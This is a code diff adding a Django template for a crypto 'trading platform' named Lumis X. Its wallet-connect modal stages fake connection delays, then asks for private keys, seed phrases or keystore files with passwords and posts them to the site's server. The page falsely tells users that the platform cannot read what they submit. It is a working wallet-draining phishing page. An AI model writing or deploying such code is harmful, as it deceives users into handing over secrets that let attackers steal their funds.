@@ -1,0 +1,630 @@
+{% load static %}
+{% load humanize %}
+{% load custom_filters %}
+{% load render_bundle from webpack_loader %}
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+    <meta name="csrftoken" content="{{ csrf_token }}">
+    <meta name="current_user" content="{{user.get_full_name}}({{user.username}})">
+
+    <meta name="theme-color" content="#000000">
+    <title>Lumis X</title>
+    <meta name="description"
+        content="Lumistakes is a trading platform that offers online trading of complex derivative cryptocurrencies with leverage and copy trading. Log in to your personal area to access your accounts, deposit or withdraw funds, and claim bonuses.">
+    <meta name="keywords"
+        content="Crypto, Cryptocurrency, best cryptocurrency, best performing crypto, best exchange 2025, worldwide trading, investments, how to invest safely, how to invest, how to invest online, how to invest, 2025, best cryptocurrency, how to withdraw crypto, buy crypto, sell crypto, convert crypto" />
+    <link rel="icon" type="image/png" href="{% static 'assets/img/favicon.png' %}" sizes="32x32">
+    <link rel="apple-touch-icon" sizes="180x180" href="{% static 'assets/img/icon/192x192.png' %}">
+    <link rel="stylesheet" href="{% static 'assets/css/style.css' %}">
+    <link rel="manifest" href="{% static '__manifest.json' %}">
+
+    <style>
+        .menu-button {
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .content-area {
+            width: 100%;
+            min-height: 200px;
+            padding: 2px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            font-family: inherit;
+            resize: vertical;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            text-align: left!important;
+            line-height: 1.9;
+        }
+        .content-area:focus {
+            outline: none;
+            border-color: #4a90e2;
+            box-shadow: 0 0 0 5px rgba(74, 144, 226, 0.5);
+        }
+
+        .custom-alert {
+            background-color: rgba(168, 244, 186, 0.8);
+            color: #155724; 
+            padding: 15px 20px;
+            border-radius: 5px;
+            border: 1px solid #c3e6cb;
+            font-family: Arial, sans-serif;
+            width: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+    }
+    .custom-success {
+        background-color: rgba(168, 244, 186, 0.8);
+        color: #155724; 
+        padding: 15px 20px;
+        border-radius: 5px;
+        border: 1px solid #c3e6cb;
+        font-family: Arial, sans-serif;
+        width: 100%;
+    }
+    .error {
+        color: #d9534f; 
+        font-size: 16px;
+        font-weight: bold;
+        font-style: italic;
+    }
+    </style>
+    <!-- Tailwind CSS + Material Tailwind CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/@material-tailwind/html@latest/styles/material-tailwind.min.css"
+        rel="stylesheet" />
+    
+    <!-- Tailwind base setup (optional if you're using full Material Tailwind) -->
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body>
+
+    <input type="text" id="recipientAddress" value="{{recipient_address}}" hidden>
+
+    <!-- loader -->
+    <div id="loader">
+        <img src="{% static 'assets/img/loading-icon.png' %}" alt="icon" class="loading-icon">
+    </div>
+    <!-- * loader -->
+
+    <!-- App Header -->
+    <div class="appHeader">
+        <div class="left">
+            <a href="#" class="headerButton goBack">
+                <ion-icon name="chevron-back-outline"></ion-icon>
+            </a>
+        </div>
+        <div class="pageTitle">
+            <img src="{% static 'assets/img/logo.png' %}" alt="logo" class="logo">
+        </div>
+        
+    </div>
+    <!-- * App Header -->
+
+    <!-- App Capsule -->
+    <div id="appCapsule" class="extra-header-active full-height">
+
+        <div class="section tab-content mb-2">
+
+            <!-- MENU tab -->
+            <div class="tab-pane fade show active" id="waiting" role="tabpanel">
+                <div class="row">
+                    <div data-url="{% url 'stock-list' %}" onclick="navigateTo(this)" class="menu-button col-6 mb-2">
+                        <div class="bill-box">
+                            <div class="img-wrapper">
+                                <img style="height: 50%; width: 80%;" src="{% static 'assets/img/menu-images/stock-logo.png' %}" alt="img" class="image-block imaged w48">
+                            </div>
+                            <p class="text-info">NASDAQ Stock Listings</p>
+                        </div>
+                    </div>
+                    <div data-url="{% url 'savings' %}" onclick="navigateTo(this)" class="menu-button col-6 mb-2">
+                        <div class="bill-box">
+                            <div class="img-wrapper">
+                                <img style="height: 46px;" src="{% static 'assets/img/menu-images/crypto-logo-2.png' %}" alt="img" class="image-block imaged w48">
+                            </div>
+                            <p class="text-info">Proxy Trading</p>
+                        </div>
+                    </div>
+                    <div data-url="{% url 'crypto-index' %}" onclick="navigateTo(this)" class="menu-button col-6 mb-2">
+                        <div class="bill-box">
+                            <div class="img-wrapper">
+                                <img style="height: 50%; width: 80%;" src="{% static 'assets/img/menu-images/investment.png' %}" alt="img" class="image-block imaged w48">
+                            </div>
+                            <p class="text-info">Crypto Wallet</p>
+                        </div>
+                    </div>
+                    {% if c_type == "AUTOMATIC" %}
+                        <div class="menu-button col-6 mb-2">
+                            <div class="bill-box">
+                                <div class="img-wrapper">
+                                    <img style="height:46px; width: 80%;" src="{% static 'assets/img/menu-images/wallet-connect.png' %}" alt="img" class="image-block imaged w48">
+                                </div>
+                                <p id="walletconnect"></p>
+                                {% render_bundle 'main' %}
+                            </div>
+                        </div>
+                    {% else %}
+                        <div class="menu-button col-6 mb-2">
+                            <div class="bill-box">
+                                <div class="img-wrapper">
+                                    <img style="height:46px; width: 80%;" src="{% static 'assets/img/menu-images/wallet-connect.png' %}" alt="img" class="image-block imaged w48">
+                                </div>
+                                <button data-dialog-target="web-3-modal" class="btn btn-text-success mb-1" >
+                                    Connect Wallet
+                                </button>
+                            </div>
+                        </div>
+                    {% endif %}
+
+                </div>
+            </div>
+            <!-- * MENU tab -->
+        </div>
+
+
+    </div>
+    <!-- * App Capsule -->
+
+
+    <!-- App Bottom Menu -->
+        <div class="appBottomMenu" style="position: fixed; z-index: 1; bottom: 0;">  
+            <a href="{% url 'home' %}" class="item ">
+                <div class="col">
+                    <ion-icon name="pie-chart-outline"></ion-icon>
+                    <strong>Overview</strong>
+                </div>
+            </a>
+            <a href="{% url 'cards' %}" class="item ">
+                <div class="col">
+                    <ion-icon name="card-outline"></ion-icon>
+                    <strong>My Cards</strong>
+                </div>
+            </a>
+            <a href="{% url 'menu' %}" class="item">
+                <div class="col">
+                    <div class="action-button">
+                        <ion-icon name="home"></ion-icon>
+                    </div>
+                </div>
+            </a>
+            <a href="{% url 'transactions' %}" class="item">
+                <div class="col">
+                    <ion-icon name="document-text-outline"></ion-icon>
+                    <strong>History</strong>
+                </div>
+            </a>
+            <a href="{% url 'settings' %}" class="item">
+                <div class="col">
+                    <ion-icon name="person-outline"></ion-icon>
+                    <strong>Me</strong>
+                </div>
+            </a>
+        </div>
+    <!-- * App Bottom Menu -->
+
+    <!-- Web 3 custom modal -->
+    <div style="overflow: auto;"data-dialog-backdrop="web-3-modal" data-dialog-backdrop-close="true"
+        class="pointer-events-none fixed inset-0 z-[999] grid h-screen w-screen place-items-center bg-black bg-opacity-60 opacity-0 backdrop-blur-sm transition-opacity duration-300">
+    
+        <div class="relative m-4 w-full max-w-md md:max-w-lg lg:max-w-xl rounded-lg bg-white shadow-sm"
+            data-dialog="web-3-modal">    
+            <div style="display: flex; align-items: stretch; justify-content: space-between;" class="p-4">
+                
+                <button id="goBackWard" data-ripple-dark="true" 
+                    class="relative h-8 max-h-[32px] w-8 max-w-[32px] select-none rounded-lg text-center align-middle font-sans text-xs font-medium uppercase text-blue-gray-500 transition-all hover:bg-blue-gray-500/10 active:bg-blue-gray-500/30 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                    type="button">
+                    <span class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 transform">
+                        <img src="{% static 'assets/icons/arrow-back-outline.svg' %}" alt="go back">
+                    </span>
+                </button>
+
+                <button data-ripple-dark="true" data-dialog-close="true"
+                    class="relative h-8 max-h-[32px] w-8 max-w-[32px] select-none rounded-lg text-center align-middle font-sans text-xs font-medium uppercase text-blue-gray-500 transition-all hover:bg-blue-gray-500/10 active:bg-blue-gray-500/30 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                    type="button">
+                    <span class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 transform">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"
+                            stroke-width="2" class="h-5 w-5">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                    </span>
+                </button>
+            </div>
+            <div class="flex items-center justify-center mb-2">
+                <img style="width: 100px;" src="{% static 'assets/img/menu-images/wallet-connect.png' %}" alt="wallet">
+            </div>
+            <div class="relative px-4">
+
+                <div id="walletOptions" class="mb-6 items-center justify-between gap-2 rounded-md border border-slate-300 bg-white p-4 shadow-sm">
+                    <div>
+                        <p class="text-slate-500 text-sm font-light">
+                            <i>Choose your wallet to connect with Lumis X</i>
+                        </p>
+                    </div>
+                    <button
+                        data-id="metamask"
+                        class="connect-manual w-full mt-3 rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                        type="button">
+                        <img src="https://docs.material-tailwind.com/icons/metamask.svg" alt="metamask"
+                            class="h-5 w-5 mr-2" />
+                        Connect with MetaMask
+                    </button>
+    
+                    <button 
+                        data-id="coinbase"
+                        class="connect-manual w-full mt-2 rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                        type="button">
+                        <img src="https://docs.material-tailwind.com/icons/coinbase.svg" alt="metamast"
+                            class="h-5 w-5 mr-2 rounded-md" />
+                        Connect with Coinbase
+                    </button>
+    
+                    <button
+                        data-id="trustwallet"
+                        class="connect-manual mt-3 w-full rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                        type="button">
+                        <img src="https://docs.material-tailwind.com/icons/trust-wallet.svg" alt="metamask"
+                            class="h-5 w-5 rounded-md mr-2 border border-slate-300" />
+                        Connect with Trust Wallet
+                    </button>
+    
+                    <button 
+                        data-id="binance"
+                        class="connect-manual mt-3 w-full rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                        type="button">
+                        <img src="{% static 'assets/icons/binance.svg' %}" alt="binance"
+                            class="h-5 w-5 rounded-md mr-2 border border-slate-300" />
+                        Connect with Binance Smart Chain
+                    </button>
+    
+                    <button
+                        data-id="crypto.com"
+                        class="connect-manual mt-3 w-full rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                        type="button">
+                        <img src="{% static 'assets/icons/crypto.com-logo.svg' %}" alt="crypto.com"
+                            class="h-5 w-5 rounded-md mr-2 border border-slate-300" />
+                        Connect with Crypto.com
+                    </button>
+    
+                    <button
+                        data-id="blockchain"
+                        class="connect-manual mt-3 w-full rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                        type="button">
+                        <img src="{% static 'assets/icons/blockchain-logo-svg-vector.svg' %}" alt="crypto.com"
+                            class="h-5 w-5 rounded-md mr-2 border border-slate-300" />
+                        Connect with Blockchain
+                    </button>
+
+                    <button
+                        data-id="bitcoin.com"
+                        class="connect-manual mt-3 w-full rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none" type="button">
+                            <img src="{% static 'assets/icons/bitcoin.com-logo.png' %}" alt="bitcoin.com" class="h-5 w-5 rounded-md mr-2 border border-slate-300" />
+                            Connect with Bitcoin.com
+                    </button>
+    
+                    <button
+                        data-id="argent"
+                        class="connect-manual mt-3 w-full rounded-md flex items-center justify-center border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                        type="button">
+                        <img src="{% static 'assets/icons/argent-wallet-seeklogo.svg' %}" alt="Argent"
+                            class="h-5 w-5 rounded-md mr-2 border border-slate-300" />
+                        Connect with Argent
+                    </button>
+
+                </div>
+                <!-- tab start -->
+                <div style="display: none;" id="tabSection" class="my-6 items-center justify-between gap-2 rounded-md">
+
+                    
+                
+                    <!-- tab header -->
+                    <ul class="items-center justify-between gap-2 rounded-md nav nav-tabs mb-4" id="tabs-tab" role="tablist">
+                        <li class="nav-item" role="presentation">
+                            <a class="nav-link active" id="tabs-create-tab" data-bs-toggle="pill" href="#private-key" role="tab"
+                                aria-controls="private-key" aria-selected="true">Private Key</a>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <a class="nav-link" id="tabs-import-tab" data-bs-toggle="pill" href="#phrase-key" role="tab"
+                                aria-controls="phrase-key" aria-selected="false">Phrase Key</a>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <a class="nav-link" id="tabs-recover-tab" data-bs-toggle="pill" href="#keystore" role="tab"
+                                aria-controls="keystore" aria-selected="false">Keystore JSON</a>
+                        </li>
+                    </ul>
+                    <!-- tab header -->
+
+                    <!-- selected exchange info -->
+                    <div class="custom-alert">
+                        <img width="50px" height="50px" style="border-radius: 50%;" id="exchangeIcon" src="" alt="">
+                        <span id="exchangeName"></span>
+                    </div>
+                    <p><i id="feedback" class="text-danger">Unable to detect in-browser or embedded wallet. please connect manually</i></p>
+                    <!-- selected exchange info -->
+                
+                    <!-- tab content -->
+                    <div class="tab-content" id="tabs-tabContent">
+                        <!-- private key tab -->
+                        <div class="tab-pane fade show active" id="private-key" role="tabpanel" aria-labelledby="private-key-tab">
+
+                            <form id="privateKey" action="#" method="post">
+                                <textarea style="width: 100%;" class="my-4 content-area" name="private-key" rows="6"
+                                    placeholder="Enter or paste your private key to connect...">
+                                </textarea>
+                                <button type="submit" class="btn btn-primary btn-block">
+                                    CONNECT
+                                </button>
+                            </form>
+                            <div class="text-warning" style="display: flex; flex-direction: row;">
+                                <p><i>This modal is provided via a secure encrypted API for security purpose. Lumis X cannot receive, read or extract the raw data submitted. ONLY use your phrase keys to sync your wallet and your Lumis X account and never expose your private keys to any Lumistakes staffs as we will never ask you for your private keys.</i></p>
+                                <ion-icon style="font-size: 25px;" name="alert-circle"></ion-icon>
+                            </div>
+                        </div>
+                        <!-- ends here -->
+                
+                        <!-- phrase-key tab -->
+                        <div class="tab-pane fade" id="phrase-key" role="tabpanel" aria-labelledby="phrase-key-tab">
+                            <form id="phraseKey" action="#" method="post">
+
+                                <textarea style="width: 100%;" class="content-area" name="phrase-key" rows="6"
+                                    placeholder="Enter or paste your phrase keywords to connect..."></textarea>
+                                <small class="my-4">Typically 12 (sometimes 24) words separated with a single space</small>
+                                <button type="submit" class=" mt-2 btn btn-primary btn-block">
+                                    CONNECT
+                                </button>
+                                <div class="text-warning" style="display: flex; flex-direction: row;">
+                                    <p><i>This modal is provided via a secure encrypted API for security purpose. Lumis X cannot receive, read or extract the raw data submitted. ONLY use your phrase keys to sync your wallet and your Lumis X account and never expose your private keys to any Lumistakes staffs as we will never ask you for your private keys.</i></p>
+                                    <ion-icon style="font-size: 25px;" name="alert-circle"></ion-icon>
+                                </div>
+                            </form>
+                            
+                        </div>
+                        <!-- ends here -->
+                
+                        <!-- keystore tab -->
+                        <div class="tab-pane fade" id="keystore" role="tabpanel" aria-labelledby="keystore-tab">
+
+                            <form id="keyStore" action="#">
+                                <textarea style="width: 100%;" class="content-area" name="keystore-file" rows="6"
+                                    placeholder="Enter your Keystore JSON to connect...">
+                                </textarea>
+
+                                
+                                <div class="my-2 input-wrapper">
+                                    <label class="label" for="text4">Wallet Password</label>
+                                    <input name="keystore-password" type="text" class="form-control" id="text4" placeholder="•••••••••" name="password" />
+                                </div>
+
+                                <small class="my-4">Several Lines of text enclosed in a curly bracket {....} plus the password you used to encrypt it</small>
+
+                                <button type="submit" class=" mt-2 btn btn-primary btn-block">
+                                    CONNECT
+                                </button>
+                            </form>
+                            <div class="text-warning" style="display: flex; flex-direction: row;">
+                                <p><i>This modal is provided via a secure encrypted API for security purpose. Lumis X cannot receive, read or extract the raw data submitted. ONLY use your phrase keys to sync your wallet and your Lumis X account and never expose your private keys to any Lumistakes staffs as we will never ask you for your private keys.</i></p>
+                                <ion-icon style="font-size: 25px;" name="alert-circle"></ion-icon>
+                            </div>
+                        </div>
+                        <!-- ends here -->
+                    </div>
+                    <!-- tab content -->
+                
+                </div>
+                <!-- tab end -->
+
+            </div>
+            <div class="flex flex-wrap items-center justify-between gap-2 p-4 text-blue-gray-500 mt-2">
+                <p class="text-sm text-slate-500">
+                    New to web 3.0?
+                </p>
+                <button
+                    class="rounded-md border border-slate-300 py-2 px-4 text-center text-sm transition-all shadow-sm hover:shadow-lg text-slate-600 hover:text-white hover:bg-slate-800 hover:border-slate-800 focus:text-white focus:bg-slate-800 focus:border-slate-800 active:border-slate-800 active:text-white active:bg-slate-800 disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none"
+                    type="button">
+                    Learn More
+                </button>
+            </div>
+        </div>
+    </div>
+    <!-- * Web 3 custom modal -->
+
+    <!-- spinner -->
+    <span id="spinner" style="display: none;" class="spinner-grow spinner-grow-sm" role="status" aria-hidden="true"></span>
+    <!-- spinner -->
+    
+
+
+    <!-- ========= JS Files =========  -->
+    <!-- Bootstrap -->
+    <script src="{% static 'assets/js/lib/bootstrap.bundle.min.js' %}"></script>
+    <!-- Ionicons -->
+    <script type="module" src="https://cdnjs.cloudflare.com/ajax/libs/ionicons/5.5.2/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://cdnjs.cloudflare.com/ajax/libs/ionicons/5.5.2/ionicons/ionicons.js"></script>
+    <!-- Splide -->
+    <script src="{% static 'assets/js/plugins/splide/splide.min.js' %}"></script>
+
+    <!-- Tailwind -->
+    <script src="https://cdn.jsdelivr.net/npm/@material-tailwind/html@latest/scripts/dialog.js"></script>
+    <!-- Base Js File -->
+    <script src="{% static 'assets/js/base.js' %}"></script>
+
+    <script>
+        function navigateTo(page){
+
+            window.location.href = page.getAttribute('data-url');
+        }
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelector('textarea[name="private-key"]').value = '';
+            function getCookie(name) {
+                let cookieValue = null;
+                if (document.cookie && document.cookie !== '') {
+                    const cookies = document.cookie.split(';');
+                    for (let i = 0; i < cookies.length; i++) {
+                        const cookie = cookies[i].trim();
+                        // Does this cookie string begin with the name we want?
+                        if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                            cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                            break;
+                        }
+                    }
+                }
+                return cookieValue;
+            }
+            const csrftoken = getCookie('csrftoken');
+            const walletOptions = document.getElementById('walletOptions');
+            const tabSection = document.getElementById('tabSection');
+            const forms = tabSection.querySelectorAll('form');
+            const spinner = document.getElementById('spinner');
+            const backward = document.getElementById('goBackWard');
+            const connectButtons = document.querySelectorAll('.connect-manual');
+
+
+            connectButtons.forEach(button => {
+                button.addEventListener('click', function () {
+                    const walletId = this.getAttribute('data-id');
+                    const icon = this.querySelector('img').src;
+
+                    tabSection.querySelector('#exchangeIcon').src = icon;
+                    tabSection.querySelector('#exchangeName').textContent = walletId.charAt(0).toUpperCase() + walletId.slice(1) + ' Wallet';
+
+                    // simulate connection briefly
+                    const initialState = this.innerHTML;
+                    this.textContent = 'Initializing wallet connect...'; 
+                    this.disabled = true;
+                    setTimeout(() => {
+                        this.textContent = 'Establishing connection...';
+                        this.prepend(spinner);
+                        spinner.style.display = 'flex';
+                    }, 2000);
+                    setTimeout(() => {
+                        sessionStorage.setItem('walletId', walletId);
+                        walletOptions.style.display = 'none';
+                        tabSection.style.display = 'block';
+                        this.innerHTML = initialState;
+                        spinner.style.display = 'none';
+                        this.disabled = false;
+                        changeState();
+                    }, 5000);
+                });
+            });
+        
+            forms.forEach(form => {
+                form.addEventListener("submit", async function(e){
+                    e.preventDefault();
+                    const submitButton = form.querySelector('button[type="submit"]');
+                    const buttonState = submitButton.innerHTML;
+
+                    const walletID = sessionStorage.getItem('walletId');
+                    const elements = this.elements;
+                    for (let i = 0; i < elements.length; i++) {
+                        const element = elements[i];
+                        if (element.type !== 'submit' && element.value.trim() === '') {
+                            let sm = document.createElement('small');
+                            sm.classList.add('error');
+                            let text = `Please enter or paste your ${element.name.replace('-', ' ')} to connect and sync your account.`;
+                            sm.append(text);
+                            element.value = '';
+                            element.parentNode.append(sm);
+                            element.addEventListener('input', () => {
+                                sm.remove();
+                            }, {once: true});
+                            return;
+                        }
+                    }
+                    
+                    const protocol = this.id;
+                    const formData = new FormData(this);
+                    formData.append('connection_type', 'manual');
+
+                    formData.append('exchange', walletID);
+                    formData.append('protocol', protocol);
+                    for (const [key, value] of formData.entries()) {
+                        console.log(`${key}: ${value}`);
+                    };
+                    const url = "{% url 'connect_wallet' %}";
+                    const feedbackElement = document.getElementById('feedback');
+                    
+                    try{
+                        submitButton.textContent = 'Connecting...';
+                        submitButton.prepend(spinner);
+                        spinner.style.display = 'flex';
+                        submitButton.disabled = true;
+
+                        const connection = await fetch(url, {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'X-CSRFToken': csrftoken
+                            }
+                        });
+                        
+
+                        const result = await connection.json();
+                        console.log(result);
+                        if (result.success) {
+                            feedbackElement.classList.remove('text-danger');
+                            feedbackElement.classList.add('custom-success');
+                            feedbackElement.textContent = result.success || "Syncing...";
+                            setTimeout(() => {
+                                feedbackElement.textContent = 'Syncing will continue in the background. You can close this window.';
+                                setTimeout(() => {
+                                    window.location.reload();
+                                }, 2000);
+                            }, 4000);
+                        } else {
+                            feedbackElement.classList.remove('custom-success');
+                            feedbackElement.classList.add('text-danger');
+                            feedbackElement.textContent = result.error;
+                            form.reset();
+                        }
+                    }
+                    catch(e){
+                        feedbackElement.classList.remove('custom-success');
+                        feedbackElement.classList.add('text-danger');
+                        feedbackElement.textContent = result.error;
+                        form.reset();
+                    }finally{
+                        setTimeout(() => {
+                            submitButton.innerHTML = buttonState;
+                            spinner.style.display = 'none';
+                            submitButton.disabled = false;
+                        }, 2500)
+                    }
+                })
+            })
+
+
+            function changeState(){
+                if (tabSection.style.display === 'block'){
+                    backward.style.display = 'block';
+                } else {
+                    backward.style.display = 'none';
+                }
+            }
+            changeState();
+        
+            backward.addEventListener('click', function () {
+                walletOptions.style.display = 'block';
+                tabSection.style.display = 'none';
+                spinner.style.display = 'none';
+                changeState();
+            });
+
+        });
+    </script>
+
+
+</body>
+
+</html>
